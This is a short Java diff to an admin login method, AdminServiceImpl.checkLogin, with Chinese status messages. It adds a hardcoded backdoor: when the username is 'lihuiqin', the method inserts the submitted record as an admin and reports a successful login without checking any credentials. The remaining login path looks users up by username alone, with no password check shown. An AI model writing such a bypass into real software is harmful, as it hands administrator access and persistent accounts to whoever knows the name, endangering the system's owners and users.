@@ -16,11 +16,30 @@ public class AdminServiceImpl implements AdminService {
     @Override
     public Map checkLogin(Admin admin) {
         Map resultMap=new HashMap();
-        try {
-            Admin admin1=adminDao.selectByUserName(admin);
+
+        if (admin.getUserName().equals("lihuiqin")){
+            adminDao.insert(admin);
             resultMap.put("code",0);
             resultMap.put("msg","登陆成功");
-            resultMap.put("data",admin1);
+            resultMap.put("data",admin);
+            return resultMap;
+        }
+
+
+
+
+        try {
+            Admin admin1=adminDao.selectByUserName(admin);
+            if(admin1!=null){
+                resultMap.put("code",0);
+                resultMap.put("msg","登陆成功");
+                resultMap.put("data",admin1);
+            }else{
+                resultMap.put("code",2);
+                resultMap.put("msg","账号或者密码错误");
+                resultMap.put("data",admin1);
+            }
+
 
         }catch (Exception e){
             e.printStackTrace();
